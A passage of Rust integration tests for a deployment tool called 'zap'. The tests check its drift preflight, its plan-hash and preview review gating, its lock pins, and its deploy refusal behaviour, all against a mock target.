            rendered.contains(
                "warning: 1 apply-managed resource(s) have drifted — review the changes \
                 with `zap apply`, converge with `zap apply --wetrun`, then re-run this \
                 deploy: its review still binds unless `zap.lock` changed\n"
            ),
            bail == DeployOutcome::PreflightDrift,
            "{rendered}"
        );
        assert!(!rendered.contains("--skip-preflight"), "{rendered}");
        assert_eq!(
            std::fs::read(rig.preview_path()).unwrap(),
            before,
            "{bail:?}"
        );

        rig.target = clean;
        let rig = rig.recording(&plan.plan);
        let wet = rig.deploy(&wetrun()).await.unwrap();
        assert_eq!(wet.outcome, DeployOutcome::Deployed, "{bail:?}: {wet:?}");
    }
}

/// A drifted resource held behind one the preflight couldn't read is drift, not
/// only an unread check: the bail is the drift bail and counts it.
#[tokio::test]
async fn a_drifted_resource_held_behind_an_unread_one_is_drift() {
    use zap_types::observe::{Observation, PathFacet, PathObservation, Privilege, Query};

    let mut rig = Rig::new("def5678");
    rig.config.resources.push(
        serde_json::from_value(serde_json::json!({
            "id": "logs", "type": "directory", "path": "/srv/logs", "depends_on": ["data"],
        }))
        .unwrap(),
    );
    rig.target = MockConnection::new(HOST)
        .with_user("deploy")
        .with(
            "if [ -L '/srv/app/current' ]; then readlink -- '/srv/app/current'; elif [ -e '/srv/app/current' ]; then exit 4; else exit 3; fi",
            ok("/srv/app/releases/def5678\n"),
        )
        .with_observation(
            Query::Path {
                path: "/srv/logs".to_owned(),
                facet: PathFacet::Kind,
                privilege: Privilege::Login,
            },
            Observation::Path(PathObservation::Failed),
        );
    rig.deploy(&DeployOptions::default()).await.unwrap();
    let report = rig.deploy(&wetrun()).await.unwrap();
    assert_eq!(report.outcome, DeployOutcome::PreflightDrift, "{report:?}");
    let held: Vec<(&str, bool)> = report
        .held
        .iter()
        .map(|held| (held.resource_id.0.as_str(), held.is_undetermined()))
        .collect();
    assert_eq!(held, [("data", true), ("logs", false)]);
    let rendered = render_deploy(&report);
    assert!(
        rendered.contains("warning: 1 apply-managed resource(s) have drifted — "),
        "{rendered}"
    );
}

/// A `pipeline` always runs (it detects absent by construction), so it is no drift:
/// a config that declares one still deploys through the preflight.
#[tokio::test]
async fn a_pipeline_is_not_preflight_drift() {
    let mut rig = Rig::new("def5678");
    rig.config.resources.push(
        serde_json::from_value(serde_json::json!({
            "id": "ci", "type": "pipeline", "steps": [{"id": "lint", "run": "true"}],
        }))
        .unwrap(),
    );
    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    let rig = rig.recording(&dry.plan);
    let wet = rig.deploy(&wetrun()).await.unwrap();
    assert_eq!(wet.outcome, DeployOutcome::Deployed, "{wet:?}");
}

/// [`Rig::new`] on systemd whose config adds a `migrate` pipeline and, per
/// `(id, restart_on, enabled)`, a service `id` that restarts on `restart_on` and reads
/// enabled or disabled; the pending-marker read lists `markers`.
fn triggered_rig(services: &[(&str, &str, bool)], markers: &str) -> Rig {
    use zap_types::observe::{CommandObservation, Observation, Query};

    let answered = |code: i32, stdout: &str| {
        Observation::Command(CommandObservation {
            code,
            stdout: stdout.as_bytes().to_vec(),
            stderr: Vec::new(),
        })
    };
    let mut rig = Rig::new("def5678");
    rig.config.target.service_manager = Some(ServiceManager::Systemd);
    rig.config.resources.push(
        serde_json::from_value(serde_json::json!({
            "id": "migrate", "type": "pipeline", "steps": [{"id": "up", "run": "true"}],
        }))
        .unwrap(),
    );
    for (id, restart_on, enabled) in services {
        rig.config.resources.push(
            serde_json::from_value(serde_json::json!({
                "id": id, "type": "service", "service": id, "enabled": true,
                "restart_on": [restart_on],
            }))
            .unwrap(),
        );
        let (code, state) = if *enabled {
            (0, "enabled\n")
        } else {
            (1, "disabled\n")
        };
        rig.target = rig
            .target
            .with_observation(
                Query::login_command(format!("systemctl is-active --quiet {id}")),
                answered(0, ""),
            )
            .with_observation(
                Query::login_command(format!("systemctl is-enabled {id}")),
                answered(code, state),
            );
    }
    rig.target = rig
        .target
        .with_observation(crate::resource::pending::read_query(), answered(0, markers));
    rig
}

/// A dry run, then the wetrun of the plan it recorded.
async fn deploy_reviewed(rig: Rig) -> DeployReport {
    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    let rig = rig.recording(&dry.plan);
    rig.deploy(&wetrun()).await.unwrap()
}

/// A converged service that restarts on a pipeline changes only because the pipeline
/// always runs, so it is no drift either, and nor is one that restarts on that service
/// in turn: the config deploys through the preflight.
#[tokio::test]
async fn a_service_triggered_only_by_a_pipeline_is_not_preflight_drift() {
    let wet = deploy_reviewed(triggered_rig(&[("app", "migrate", true)], "")).await;
    assert_eq!(wet.outcome, DeployOutcome::Deployed, "{wet:?}");
    assert!(wet.warnings.is_empty(), "{:?}", wet.warnings);

    let spread = triggered_rig(&[("app", "migrate", true), ("web", "app", true)], "");
    let wet = deploy_reviewed(spread).await;
    assert_eq!(wet.outcome, DeployOutcome::Deployed, "{wet:?}");
    assert!(wet.warnings.is_empty(), "{:?}", wet.warnings);
}

/// A triggered service is still drift when a pending marker says an earlier apply owes
/// its restart, or when it drifted besides: only `zap apply --wetrun` clears either.
#[tokio::test]
async fn a_triggered_service_owed_a_restart_or_drifted_is_preflight_drift() {
    let pending = triggered_rig(&[("app", "migrate", true)], "app restart\n");
    let wet = deploy_reviewed(pending).await;
    assert_eq!(wet.outcome, DeployOutcome::PreflightDrift, "{wet:?}");
    assert!(
        wet.warnings
            .iter()
            .any(|w| w.starts_with("1 apply-managed resource(s) have drifted")),
        "{:?}",
        wet.warnings
    );

    let drifted = triggered_rig(&[("app", "migrate", false)], "");
    let wet = deploy_reviewed(drifted).await;
    assert_eq!(wet.outcome, DeployOutcome::PreflightDrift, "{wet:?}");
}

/// [`triggered_rig`] whose `migrate` pipeline depends on a directory the preflight
/// can't read, so the pipeline and every service it fires are held behind it.
fn triggered_rig_behind_unread(services: &[(&str, &str, bool)], markers: &str) -> Rig {
    let mut rig = triggered_rig(services, markers);
    rig.config.resources.push(
        serde_json::from_value(serde_json::json!({
            "id": "secrets", "type": "directory", "path": "/srv/secrets",
        }))
        .unwrap(),
    );
    let migrate = rig
        .config
        .resources
        .iter_mut()
        .find(|resource| resource.id.0 == "migrate")
        .unwrap();
    migrate.depends_on = vec![ResourceId("secrets".to_owned())];
    rig
}

/// A converged service fired only by a pipeline that waits on an unread resource is
/// held behind it, but it is no drift: the bail is the undetermined one, with no drift
/// warning.
#[tokio::test]
async fn a_held_service_triggered_only_by_a_pipeline_is_undetermined_not_drift() {
    let wet = deploy_reviewed(triggered_rig_behind_unread(&[("app", "migrate", true)], "")).await;
    assert_eq!(wet.outcome, DeployOutcome::PreflightUndetermined, "{wet:?}");
    let held: Vec<(&str, bool)> = wet
        .held
        .iter()
        .map(|held| (held.resource_id.0.as_str(), held.is_undetermined()))
        .collect();
    assert_eq!(
        held,
        [("secrets", true), ("migrate", false), ("app", false)],
        "{wet:?}"
    );
    assert!(
        !wet.warnings.iter().any(|w| w.contains("have drifted")),
        "{:?}",
        wet.warnings
    );
}

/// The same held service is drift when it drifted besides being triggered: drift
/// outranks undetermined.
#[tokio::test]
async fn a_held_triggered_service_that_drifted_is_preflight_drift() {
    let wet = deploy_reviewed(triggered_rig_behind_unread(
        &[("app", "migrate", false)],
        "",
    ))
    .await;
    assert_eq!(wet.outcome, DeployOutcome::PreflightDrift, "{wet:?}");
    assert!(
        wet.warnings
            .iter()
            .any(|w| w.starts_with("1 apply-managed resource(s) have drifted")),
        "{:?}",
        wet.warnings
    );
}

/// A held service fired only by another such held service is no drift either: the
/// exemption spreads through holds at the same fixed point as through changes.
#[tokio::test]
async fn a_held_service_fired_by_an_exempt_hold_is_undetermined() {
    let rig = triggered_rig_behind_unread(&[("app", "migrate", true), ("web", "app", true)], "");
    let wet = deploy_reviewed(rig).await;
    assert_eq!(wet.outcome, DeployOutcome::PreflightUndetermined, "{wet:?}");
    let held: Vec<&str> = wet
        .held
        .iter()
        .map(|held| held.resource_id.0.as_str())
        .collect();
    assert_eq!(held, ["secrets", "migrate", "app", "web"], "{wet:?}");
}

/// A held service owed a restart an earlier apply never completed is drift, though
/// only a pipeline fires it.
#[tokio::test]
async fn a_held_triggered_service_owed_a_restart_is_preflight_drift() {
    let rig = triggered_rig_behind_unread(&[("app", "migrate", true)], "app restart\n");
    let wet = deploy_reviewed(rig).await;
    assert_eq!(wet.outcome, DeployOutcome::PreflightDrift, "{wet:?}");
}

/// [`preflight_drift_count`](super::preflight_drift_count) over a plan of `changes`
/// (`(id, trigger sources, pending)`; `None` sources for a change no trigger fired)
/// with `converged` the ids detected converged, every other change drifted, and
/// `migrate` the config's one pipeline.
fn drift_count(changes: &[(&str, Option<&[&str]>, bool)], converged: &[&str]) -> usize {
    drift_count_held(changes, &[], converged)
}

/// [`drift_count`] with `held` (the same shape) held behind an unread resource rather
/// than planned.
fn drift_count_held(
    changes: &[(&str, Option<&[&str]>, bool)],
    held: &[(&str, Option<&[&str]>, bool)],
    converged: &[&str],
) -> usize {
    use std::collections::BTreeMap;

    use zap_types::detected::{CurrentState, Detection};
    use zap_types::plan::{Change, ChangeAction, Plan, PlanResult, Trigger, TriggerKind};

    let config: zap_types::schema::ZapConfig = serde_json::from_value(serde_json::json!({
        "target": {"host": HOST, "user": "deploy", "service_manager": "systemd"},
        "resources": [
            {"id": "migrate", "type": "pipeline", "steps": [{"id": "up", "run": "true"}]},
        ],
    }))
    .unwrap();
    let id = |id: &str| ResourceId(id.to_owned());
    let detected: BTreeMap<ResourceId, Detection> = changes
        .iter()
        .chain(held)
        .map(|(resource, ..)| {
            let detection = if converged.contains(resource) {
                Detection::Converged
            } else {
                Detection::Drifted {
                    current: CurrentState::Service {
                        is_running: true,
                        is_enabled: false,
                    },
                }
            };
            (id(resource), detection)
        })
        .collect();
    let trigger = |sources: Option<&[&str]>, pending: bool| {
        sources
            .map(|sources| Trigger {
                kind: TriggerKind::Restart,
                sources: sources.iter().map(|source| id(source)).collect(),
                pending,
            })
            .or_else(|| {
                pending.then(|| Trigger {
                    kind: TriggerKind::Restart,
                    sources: Vec::new(),
                    pending: true,
                })
            })
    };
    let changes = changes
        .iter()
        .map(|(resource, sources, pending)| Change {
            resource_id: id(resource),
            action: ChangeAction::Update,
            steps: Vec::new(),
            desired: serde_json::from_value(serde_json::json!({
                "id": resource, "type": "service", "service": resource, "enabled": true,
            }))
            .unwrap(),
            depends_on: Vec::new(),
            trigger: trigger(*sources, *pending),
        })
        .collect();
    let held = held
        .iter()
        .map(|(resource, sources, pending)| HeldResource {
            resource_id: id(resource),
            cause: HoldCause::Waits {
                on: vec![id("unread")],
            },
            trigger: trigger(*sources, *pending),
        })
        .collect();
    let result = PlanResult {
        plan: Plan {
            references: BTreeMap::new(),
            changes,
            target: config.target.clone(),
            machine: crate::test_support::local_machine(),
        },
        warnings: Vec::new(),
        held,
    };
    super::preflight_drift_count(&config, &result, &detected)
}

/// The preflight exempts a converged service fired only by exempt sources, to a fixed
/// point whatever the order of the changes, and counts everything else.
#[test]
fn the_preflight_exempts_only_changes_fired_by_what_always_runs() {
    let migrate: &[&str] = &["migrate"];
    // a converged service restarting on the pipeline, and one restarting on that
    assert_eq!(
        drift_count(
            &[
                ("app", Some(migrate), false),
                ("web", Some(&["app"]), false)
            ],
            &["app", "web"],
        ),
        0
    );
    // the spread holds whatever order the plan lists them in
    assert_eq!(
        drift_count(
            &[
                ("web", Some(&["app"]), false),
                ("app", Some(migrate), false)
            ],
            &["app", "web"],
        ),
        0
    );
    // a trigger naming no source, owing nothing, is never exempt
    assert_eq!(drift_count(&[("app", Some(&[]), false)], &["app"]), 1);
    // a pending marker, alone or beside an exempt source
    assert_eq!(drift_count(&[("app", None, true)], &["app"]), 1);
    assert_eq!(drift_count(&[("app", Some(migrate), true)], &["app"]), 1);
    // a service that drifted besides being triggered
    assert_eq!(drift_count(&[("app", Some(migrate), false)], &[]), 1);
    // a trigger with a source that is drift — itself, and what it fires
    assert_eq!(
        drift_count(
            &[
                ("unit", None, false),
                ("app", Some(&["migrate", "unit"]), false),
            ],
            &["app"],
        ),
        2
    );
    // drift spreads: what restarts on a counted service is counted too
    assert_eq!(
        drift_count(
            &[("app", Some(migrate), true), ("web", Some(&["app"]), false)],
            &["app", "web"],
        ),
        2
    );
}

/// A resource held behind an unread one is exempt by the same rule as a change, over
/// one fixed point with the changes: a hold fired only by what always runs isn't
/// counted, nor is what a planned exempt change or another exempt hold fires, while a
/// hold that drifted, owes a restart, or has a drifted source is.
#[test]
fn the_preflight_exempts_holds_by_the_rule_for_changes() {
    let migrate: &[&str] = &["migrate"];
    // a held service fired only by the pipeline
    assert_eq!(
        drift_count_held(&[], &[("app", Some(migrate), false)], &["app"]),
        0
    );
    // the fixed point spans both: a hold fired by an exempt hold, and a change fired by
    // an exempt hold, and a hold fired by an exempt change; mechanism only — no real
    // plan has a trigger edge between a change and a hold (a held service's sources are
    // held too, and what a held source fires waits on it), so this pins the shared fixed
    // point, not a planner case
    assert_eq!(
        drift_count_held(
            &[("web", Some(&["app"]), false)],
            &[
                ("app", Some(migrate), false),
                ("api", Some(&["web"]), false)
            ],
            &["app", "web", "api"],
        ),
        0
    );
    // a held resource no trigger fired, a held service that drifted besides, and one
    // owed a restart
    assert_eq!(drift_count_held(&[], &[("unit", None, false)], &[]), 1);
    assert_eq!(
        drift_count_held(&[], &[("app", Some(migrate), false)], &[]),
        1
    );
    assert_eq!(
        drift_count_held(&[], &[("app", Some(migrate), true)], &["app"]),
        1
    );
    // a held service with a drifted source, planned or held: both counted
    assert_eq!(
        drift_count_held(
            &[("unit", None, false)],
            &[("app", Some(&["migrate", "unit"]), false)],
            &["app"],
        ),
        2
    );
    assert_eq!(
        drift_count_held(
            &[],
            &[("unit", None, false), ("app", Some(&["unit"]), false)],
            &["app"],
        ),
        2
    );
}

/// One review covers one execution. After a deploy that ran its steps — to the end,
/// or to a step that failed before the swap, which leaves the target and so the plan
/// exactly as reviewed — the preview no longer binds: the same wetrun again refuses.
#[tokio::test]
async fn an_executed_deploy_spends_its_preview_whether_it_succeeds_or_fails() {
    // Succeeds. The mock target still reads the old release, so the plan is the same.
    let rig = Rig::new("def5678");
    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    let rig = rig.recording(&dry.plan);
    let wet = rig.deploy(&wetrun()).await.unwrap();
    assert_eq!(wet.outcome, DeployOutcome::Deployed, "{wet:?}");
    let again = rig.deploy(&wetrun()).await.unwrap();
    assert_eq!(again.plan_hash, dry.plan_hash);
    assert_eq!(
        again.outcome,
        DeployOutcome::Refused(PlanUnreviewed::NoPreview { prior: None })
    );

    // Fails at its first step: the build has no recording.
    let rig = Rig::new("def5678");
    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    let failed = rig.deploy(&wetrun()).await.unwrap();
    assert_eq!(failed.outcome, DeployOutcome::Failed, "{failed:?}");
    assert_eq!(failed.exit_code(), 1);
    assert!(
        matches!(failed.step_outcomes.first(), Some(StepOutcome::Failed { step, .. }) if step == "build"),
        "{:?}",
        failed.step_outcomes
    );
    assert_eq!(rig.preview(), None);
    let rendered = render_deploy(&failed);
    assert!(
        rendered.contains(
            "  this deploy spent its review: before re-running, preview again with `zap \
             deploy` (or pass --expect-plan with the hash that preview prints)\n"
        ),
        "{rendered}"
    );
    assert!(!render_deploy(&wet).contains("spent its review"));
    let again = rig.deploy(&wetrun()).await.unwrap();
    assert_eq!(again.plan_hash, dry.plan_hash, "nothing moved");
    assert_eq!(
        again.outcome,
        DeployOutcome::Refused(PlanUnreviewed::NoPreview { prior: None })
    );
}

/// A preview that can't be withdrawn stops the deploy before its first step: left in
/// place it would bind a second wetrun to a review already spent.
#[tokio::test]
async fn a_preview_that_cannot_be_withdrawn_stops_the_deploy() {
    let rig = Rig::new("def5678");
    let plan = rig.deploy_without_home(&DeployOptions::default()).await;
    let plan = plan.unwrap();
    let rig = rig.recording(&plan.plan);
    // Something that is no record and can't be removed as a file sits at the path.
    std::fs::create_dir_all(rig.preview_path().join("occupied")).unwrap();
    let result = rig.deploy(&wetrun_expecting(&plan.plan_hash)).await;
    let Err(error @ crate::error::Error::PreviewWithdraw { .. }) = result else {
        panic!("{result:?}");
    };
    assert_eq!(error.exit_code(), 1);
    assert!(
        error.to_string().contains("nothing was deployed"),
        "{error}"
    );
    assert!(!rig.local.issued("make"));
    assert_eq!(rig.issued_past_the_plan(), Vec::<String>::new());
}

/// A file at the preview's path that isn't a current-version record is no preview:
/// the wetrun refuses as it does with nothing recorded, and its own render replaces
/// the file.
#[tokio::test]
async fn a_corrupt_or_other_version_record_is_no_preview() {
    use zap_types::deploy_preview::DEPLOY_PREVIEW_VERSION;

    let rig = Rig::new("def5678");
    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    let good = std::fs::read(rig.preview_path()).unwrap();
    let mut other_version: serde_json::Value = serde_json::from_slice(&good).unwrap();
    assert_eq!(other_version["plan_hash"], dry.plan_hash.as_str());
    other_version["version"] = serde_json::json!(DEPLOY_PREVIEW_VERSION + 1);
    let mut other_host: serde_json::Value = serde_json::from_slice(&good).unwrap();
    other_host["host"] = serde_json::json!("other.example.com");

    for (what, bytes) in [
        ("corrupt", b"{\"version\": 1, \"plan_ha".to_vec()),
        (
            "another version",
            serde_json::to_vec(&other_version).unwrap(),
        ),
        ("another host's", serde_json::to_vec(&other_host).unwrap()),
    ] {
        std::fs::write(rig.preview_path(), &bytes).unwrap();
        let report = rig.deploy(&wetrun()).await.unwrap();
        assert_eq!(
            report.outcome,
            DeployOutcome::Refused(PlanUnreviewed::NoPreview { prior: None }),
            "{what}"
        );
        assert_eq!(rig.issued_past_the_plan(), Vec::<String>::new(), "{what}");
        assert_eq!(rig.preview().unwrap().plan_hash, dry.plan_hash, "{what}");
    }
}

/// With no `~/.zap` there is nowhere to record a preview: the dry run says the
/// wetrun will need `--expect-plan`, a bare wetrun refuses, and the named hash binds.
#[tokio::test]
async fn without_a_state_directory_only_expect_plan_binds() {
    let rig = Rig::new("def5678");
    let dry = rig
        .deploy_without_home(&DeployOptions::default())
        .await
        .unwrap();
    assert_eq!(dry.outcome, DeployOutcome::DryRun);
    let rendered = render_deploy(&dry);
    assert!(
        rendered.contains(&format!(
            "warning: this preview was not recorded (zap has no state directory: set \
             ZAP_HOME or HOME), so a wetrun binds to it only with --expect-plan {}\n",
            dry.plan_hash
        )),
        "{rendered}"
    );
    assert_eq!(rig.previews_on_disk(), Vec::<String>::new());

    let rig = rig.recording(&dry.plan);
    let bare = rig.deploy_without_home(&wetrun()).await.unwrap();
    assert_eq!(
        bare.outcome,
        DeployOutcome::Refused(PlanUnreviewed::NoPreview { prior: None })
    );
    assert!(
        bare.warnings
            .iter()
            .any(|warning| warning.starts_with("this preview was not recorded")),
        "{:?}",
        bare.warnings
    );
    assert!(
        render_deploy(&dry).contains(&format!(
            "  (dry-run — re-run with --wetrun --expect-plan {} to deploy)\n",
            dry.plan_hash
        )),
        "{}",
        render_deploy(&dry)
    );
    // Nothing was recorded, so the remedy offers the hash and no bare re-run.
    assert_eq!(bare.recorded, None);
    let rendered = render_deploy(&bare);
    assert!(
        rendered.contains(&format!(
            "  review the plan above, then re-run with --expect-plan {}\n",
            bare.plan_hash
        )),
        "{rendered}"
    );
    assert!(!rendered.contains("binds to this preview"), "{rendered}");
    let bound = rig
        .deploy_without_home(&DeployOptions {
            skip_preflight: true,
            ..wetrun_expecting(&dry.plan_hash)
        })
        .await
        .unwrap();
    // `--skip-preflight` is another plan, so this names the wrong one …
    assert_eq!(bound.outcome, refused(&dry.plan_hash));
    // … and the plan's own hash deploys with nothing recorded anywhere.
    let bound = rig
        .deploy_without_home(&DeployOptions {
            skip_preflight: true,
            ..wetrun_expecting(&bound.plan_hash)
        })
        .await
        .unwrap();
    assert_eq!(bound.outcome, DeployOutcome::Deployed, "{bound:?}");
}

/// What the drift preflight checks is part of the plan: the preview shows how many
/// resources and their digest, and removing or editing one after the review — which
/// changes no step — is another plan that the preview doesn't bind.
#[tokio::test]
async fn a_resource_removed_or_edited_after_the_review_is_a_different_plan() {
    use zap_types::deploy_preview::DeployPreviewPass;
    type Edit = (&'static str, fn(&mut Rig));

    let two = || {
        let mut rig = Rig::new("def5678");
        rig.config.resources.push(
            serde_json::from_value(serde_json::json!({
                "id": "logs", "type": "directory", "path": "/var/log/app",
            }))
            .unwrap(),
        );
        rig
    };
    let digest_of = |report: &DeployReport| match &report.plan.preflight {
        DriftPreflight::Checks { resources, digest } => (*resources, digest.clone()),
        other => panic!("{other:?}"),
    };
    let rig = two();
    let reviewed = rig.deploy(&DeployOptions::default()).await.unwrap();
    let (count, digest) = digest_of(&reviewed);
    assert_eq!(count, 2);
    assert!(
        render_deploy(&reviewed).contains(&format!(
            "  preflight: 2 apply-managed resource(s), digest {digest}, are checked for \
             drift before the steps\n"
        )),
        "{}",
        render_deploy(&reviewed)
    );

    let edits: [Edit; 2] = [
        ("removed", |rig| drop(rig.config.resources.pop())),
        ("edited", |rig| {
            rig.config.resources[1] = serde_json::from_value(serde_json::json!({
                "id": "logs", "type": "directory", "path": "/var/log/other",
            }))
            .unwrap();
        }),
    ];
    for (what, edit) in edits {
        let mut rig = two();
        rig.deploy(&DeployOptions::default()).await.unwrap();
        let ran_at = rig.preview().unwrap().ran_at;
        edit(&mut rig);
        let rig = rig.recording(&reviewed.plan);
        let report = rig.deploy(&wetrun()).await.unwrap();
        assert_eq!(
            report.plan.steps, reviewed.plan.steps,
            "{what}: no step moved"
        );
        assert_ne!(digest_of(&report).1, digest, "{what}");
        assert_ne!(report.plan_hash, reviewed.plan_hash, "{what}");
        assert_eq!(
            report.outcome,
            DeployOutcome::Refused(PlanUnreviewed::Changed {
                reviewed: reviewed.plan_hash.clone(),
                command: DeployPreviewPass::DryRun,
                ran_at,
            }),
            "{what}"
        );
        assert!(rig.target.issued_queries().is_empty(), "{what}");
    }

    // `--skip-preflight` checks nothing, so it names no resources: the same edit
    // under it is the same plan.
    let skip = DeployOptions {
        skip_preflight: true,
        ..DeployOptions::default()
    };
    let mut rig = two();
    let skipped = rig.deploy(&skip).await.unwrap();
    rig.config.resources.pop();
    assert_eq!(
        rig.deploy(&skip).await.unwrap().plan_hash,
        skipped.plan_hash
    );
}

/// The preflight's digest holds references as written, as the convergence plan
/// does: no environment value moves it, set or not, secret or not. So a dry run made
/// without a resource's variables records a preview the wetrun that has them binds
/// to.
#[tokio::test]
async fn the_preflight_digest_is_the_same_in_every_environment() {
    let rig_for = || {
        let mut rig = Rig::new("def5678");
        rig.config.resources = vec![
            serde_json::from_value(serde_json::json!({
                "id": "data", "type": "directory",
                "path": Text::of_pieces([
                    Lit("/srv/"),
                    Ref("ZAP_T_APP_DIR"),
                    Lit("/"),
                    Ref("ZAP_T_API_KEY"),
                ]),
            }))
            .unwrap(),
        ];
        rig
    };
    let rig = rig_for();
    // Nothing set: the dry run warns, and records what it printed.
    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    assert_eq!(dry.outcome, DeployOutcome::DryRun);
    assert!(
        dry.warnings
            .iter()
            .any(|warning| warning.contains("ZAP_T_APP_DIR")),
        "{:?}",
        dry.warnings
    );
    for env in [
        vec![("ZAP_T_APP_DIR", "a"), ("ZAP_T_API_KEY", "hunter2hunter2")],
        vec![("ZAP_T_APP_DIR", "b"), ("ZAP_T_API_KEY", "another-secret")],
    ] {
        let _env = crate::resolve::test_env::set(&env);
        let hash = rig_for()
            .deploy_without_home(&DeployOptions::default())
            .await
            .unwrap()
            .plan_hash;
        assert_eq!(hash, dry.plan_hash, "{env:?}");
    }

    // The wetrun, with everything set, passes the gate on that preview: it gets as
    // far as the preflight, which reads the resource.
    let _env = crate::resolve::test_env::set(&[
        ("ZAP_T_APP_DIR", "a"),
        ("ZAP_T_API_KEY", "hunter2hunter2"),
    ]);
    let wet = rig.deploy(&wetrun()).await.unwrap();
    assert_eq!(wet.plan_hash, dry.plan_hash);
    assert_eq!(wet.outcome, DeployOutcome::PreflightUndetermined, "{wet:?}");
    assert!(!rig.target.issued_queries().is_empty());
}

/// The digest names the pin the preflight compares against — the on-disk lock's,
/// read once for both: advancing a tracked pin after the review is another plan, and
/// a pin the ledger can't vouch for is withheld from the digest as it is from
/// detection.
#[tokio::test]
async fn the_preflight_digest_names_the_on_disk_pin() {
    use zap_types::lock::{LockEntry, ZapLock};
    use zap_types::scalar::ContentHash;
    use zap_types::schema::ResourceId;

    use crate::lock::{LockAddressing, lock_path_for, write_zap_lock};

    let mut rig = Rig::new("def5678");
    rig.config.resources = vec![
        serde_json::from_value(serde_json::json!({
            "id": "blob", "type": "file", "path": "/opt/blob",
            "content": {"type": "remote", "url": "https://files.example/blob",
                        "extract": {"type": "none"}},
        }))
        .unwrap(),
    ];
    let lock_path = lock_path_for(&rig.config_path);
    let write = |pin: &str, current: bool| {
        let blake3 = ContentHash::new(pin.repeat(64)).unwrap();
        let unaddressed = LockEntry::RemoteFile {
            config_hash: String::new(),
            blake3: blake3.clone(),
        };
        let config_hash = if current {
            LockAddressing::of(&rig.config)
                .entry_config_hash(&rig.config.resources[0], &unaddressed, |_| None)
                .unwrap()
        } else {
            "not-this-config".to_owned()
        };
        let lock = ZapLock {
            entries: [(
                ResourceId("blob".to_owned()),
                LockEntry::RemoteFile {
                    config_hash,
                    blake3,
                },
            )]
            .into(),
            ..ZapLock::default()
        };
        write_zap_lock(&lock_path, &lock).unwrap();
    };
    let hash = || async {
        rig.deploy_without_home(&DeployOptions::default())
            .await
            .unwrap()
            .plan_hash
    };
    let unpinned = hash().await;
    write("a", true);
    let pinned = hash().await;
    assert_ne!(pinned, unpinned);
    assert_eq!(pinned, hash().await);
    write("b", true);
    assert_ne!(hash().await, pinned, "an advanced pin");
    write("a", false);
    assert_eq!(hash().await, unpinned, "a stale pin is withheld");
    // The dry run says what the wetrun's preflight will bail on.
    let dry = rig.deploy_without_home(&DeployOptions::default()).await;
    let rendered = render_deploy(&dry.unwrap());
    assert!(
        rendered.contains(
            "  LOCK — the pin ledger does not answer for 1 resource(s), so the drift \
             preflight cannot check them and a wetrun stops there:\n"
        ),
        "{rendered}"
    );
    assert!(rendered.contains("      blob — stale: "), "{rendered}");
    write("a", true);
    let dry = rig.deploy_without_home(&DeployOptions::default()).await;
    assert!(!render_deploy(&dry.unwrap()).contains("LOCK"));

    // A lock that can't be read stops the dry run: its plan can't say what the
    // preflight would compare against.
    std::fs::write(&lock_path, b"not a lock").unwrap();
    let issued = rig.target.issued_commands().len();
    let result = rig.deploy_without_home(&DeployOptions::default()).await;
    assert!(
        matches!(result, Err(crate::error::Error::LockParse { .. })),
        "{result:?}"
    );
    assert_eq!(
        rig.target.issued_commands().len(),
        issued,
        "before the target"
    );
}

/// The recorded-preview gate holds under the flags that change the plan: a wetrun
/// with `--force` or `--skip-preflight` and nothing previewed refuses like any
/// other, and its render is the preview the same flags then bind to.
#[tokio::test]
async fn neither_force_nor_skip_preflight_reaches_past_the_recorded_review() {
    for (live, options) in [
        (
            "abc1234",
            DeployOptions {
                force: true,
                ..wetrun()
            },
        ),
        (
            "def5678",
            DeployOptions {
                skip_preflight: true,
                ..wetrun()
            },
        ),
    ] {
        let rig = Rig::new(live);
        let plan = rig
            .deploy_without_home(&DeployOptions {
                wetrun: false,
                ..options.clone()
            })
            .await
            .unwrap();
        let rig = rig.recording(&plan.plan);
        let cold = rig.deploy(&options).await.unwrap();
        assert_eq!(
            cold.outcome,
            DeployOutcome::Refused(PlanUnreviewed::NoPreview { prior: None }),
            "{options:?}"
        );
        assert_eq!(
            rig.issued_past_the_plan(),
            Vec::<String>::new(),
            "{options:?}"
        );
        let wet = rig.deploy(&options).await.unwrap();
        assert_eq!(wet.outcome, DeployOutcome::Deployed, "{options:?}: {wet:?}");
    }
}

/// A refusal for a hash `--expect-plan` named wrong is a preview like any other
/// refusal: the render says a bare wetrun binds to it, and one does.
#[tokio::test]
async fn a_refused_expect_plan_records_the_plan_it_rendered() {
    use zap_types::deploy_preview::DeployPreviewPass;

    let rig = Rig::new("def5678");
    let plan = rig.deploy_without_home(&DeployOptions::default()).await;
    let rig = rig.recording(&plan.unwrap().plan);
    let wrong = rig.deploy(&wetrun_expecting("not-the-plan")).await.unwrap();
    assert_eq!(wrong.outcome, refused("not-the-plan"));
    let preview = rig.preview().expect("the refusal records what it rendered");
    assert_eq!(preview.plan_hash, wrong.plan_hash);
    assert_eq!(preview.pass, DeployPreviewPass::RefusedWetrun);
    let wet = rig.deploy(&wetrun()).await.unwrap();
    assert_eq!(wet.outcome, DeployOutcome::Deployed, "{wet:?}");
}

/// A wetrun of a masked-host config is refused before the lock is read: an
/// unreadable `zap.lock` beside it doesn't get to answer first.
#[tokio::test]
async fn a_masked_host_wetrun_is_rejected_before_the_lock_is_read() {
    let _env = crate::resolve::test_env::set(&[("ZAP_T_HOST_TOKEN", "hidden.example.com")]);
    let rig = Rig::on(&Text::reference("ZAP_T_HOST_TOKEN"), "def5678");
    std::fs::write(crate::lock::lock_path_for(&rig.config_path), b"not a lock").unwrap();
    let result = rig.deploy(&wetrun()).await;
    assert!(
        matches!(&result, Err(crate::error::Error::WetrunRefused(message))
            if message.starts_with("a deploy wetrun needs a plan that names one machine")),
        "{result:?}"
    );
}

/// One referenced declaration under two environments is two hosts with a preview
/// each, filed under the host the plan names: previewing the second leaves the
/// first's in place, and each wetrun binds to its own.
#[tokio::test]
async fn one_declared_host_under_two_environments_keeps_a_preview_each() {
    use crate::deploy_preview::read_deploy_preview;

    let rig = Rig::on(&Text::reference("ZAP_T_DEPLOY_HOST"), "def5678");
    let mut hashes = Vec::new();
    for host in ["a.example.com", "b.example.com"] {
        let _env = crate::resolve::test_env::set(&[("ZAP_T_DEPLOY_HOST", host)]);
        let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
